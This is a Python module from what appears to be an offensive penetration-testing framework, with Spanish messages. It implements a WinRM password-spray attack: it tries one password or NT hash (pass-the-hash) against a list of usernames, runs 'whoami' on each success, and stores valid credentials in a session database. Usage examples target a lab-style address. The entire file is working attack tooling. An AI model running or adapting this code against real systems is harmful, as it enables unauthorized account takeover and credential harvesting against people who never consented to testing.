# scripts/winrm/attack/password-spray.py

import time
from scripts.base import BaseScript
from core.output import print_result, print_table, console
from core import session_db

try:
    from modules.winrm import WinRMModule
    _WINRM_OK = True
except ImportError:
    _WINRM_OK = False


class Script(BaseScript):
    name        = "password-spray"
    protocol    = "winrm"
    category    = "attack"
    description = (
        "Password spray vía WinRM: prueba una contraseña contra una lista de usuarios. "
        "Detecta si el usuario existe pero la contraseña es incorrecta vs acceso válido. "
        "Soporta pass-the-hash (-H)."
    )

    EXAMPLES = [
        {
            "flag":  "--userlist / -p",
            "desc":  "Lista de usuarios y contraseña",
            "good":  "lobera.py winrm --script=password-spray -t 10.129.1.5 --userlist users.txt -p 'Summer2024!'",
            "bad":   "lobera.py winrm --script=password-spray -t 10.129.1.5 --userlist users.txt  [sin -p]",
        },
        {
            "flag":  "--delay",
            "desc":  "Segundos entre intentos (default: 1)",
            "good":  "lobera.py winrm --script=password-spray -t 10.129.1.5 --userlist users.txt -p 'Pass!' --delay 2",
            "bad":   "lobera.py winrm --script=password-spray -t 10.129.1.5 --userlist users.txt -p 'Pass!' --delay 0  [puede bloquear cuentas]",
        },
    ]

    def run(self, **kwargs):
        if not _WINRM_OK:
            print_result("WINRM", str(self.target.ip), "fail",
                         "modules/winrm.py no disponible"); return []

        userlist_path = kwargs.get("userlist")
        password      = self.creds.password
        nt_hash       = self.creds.hash
        delay         = float(kwargs.get("delay", 1))
        use_ssl       = kwargs.get("ssl", False)
        port          = kwargs.get("port")

        if not userlist_path:
            console.print("[red]--userlist es obligatorio[/red]"); return []
        if not password and not nt_hash:
            console.print("[red]-p o -H es obligatorio[/red]"); return []

        try:
            with open(userlist_path, encoding="utf-8", errors="replace") as f:
                users = [l.strip() for l in f if l.strip()]
        except OSError as exc:
            console.print(f"[red]No se pudo leer {userlist_path}: {exc}[/red]"); return []

        secret_display = nt_hash[:8] + "…" if nt_hash else "*" * len(password)
        print_result("WINRM", str(self.target.ip), "info",
                     "Spray WinRM: {} usuarios, secreto '{}'".format(
                         len(users), secret_display))

        valid = []
        for i, user in enumerate(users, 1):
            from core.credentials import Creds
            spray_creds = Creds(
                user=user,
                password=password,
                domain=self.creds.domain,
                hash=nt_hash,
            )
            w = WinRMModule(self.target, spray_creds, use_ssl=use_ssl, port=port)
            try:
                import winrm
                scheme   = "https" if use_ssl else "http"
                ep       = "{}://{}:{}/wsman".format(scheme, self.target.ip,
                                                     port or (5986 if use_ssl else 5985))
                transport = "ntlm"
                pwd_field = ":{}".format(nt_hash.split(":")[-1]) if nt_hash else password
                sess = winrm.Session(ep, auth=(user, pwd_field),
                                     transport=transport,
                                     server_cert_validation="ignore",
                                     read_timeout_sec=10,
                                     operation_timeout_sec=8)
                resp = sess.run_cmd("whoami")
                if resp.status_code == 0:
                    whoami = resp.std_out.decode(errors="replace").strip()
                    print_result("WINRM", str(self.target.ip), "pwned",
                                 "[{}/{}] {} ← VÁLIDA ({})".format(
                                     i, len(users), user, whoami))
                    valid.append({"user": user, "password": password or nt_hash})
                    session_db.save_credential(
                        str(self.target.ip), user,
                        password or nt_hash,
                        "hash" if nt_hash else "password",
                        valid=True, source="winrm_spray",
                    )
            except Exception:
                pass  # Credencial inválida

            if delay > 0 and i < len(users):
                time.sleep(delay)

        if valid:
            print_table("Credenciales válidas", ["Usuario","Secreto"],
                        [(v["user"], secret_display) for v in valid])
        else:
            print_result("WINRM", str(self.target.ip), "info",
                         "Ninguna credencial válida")
        return valid
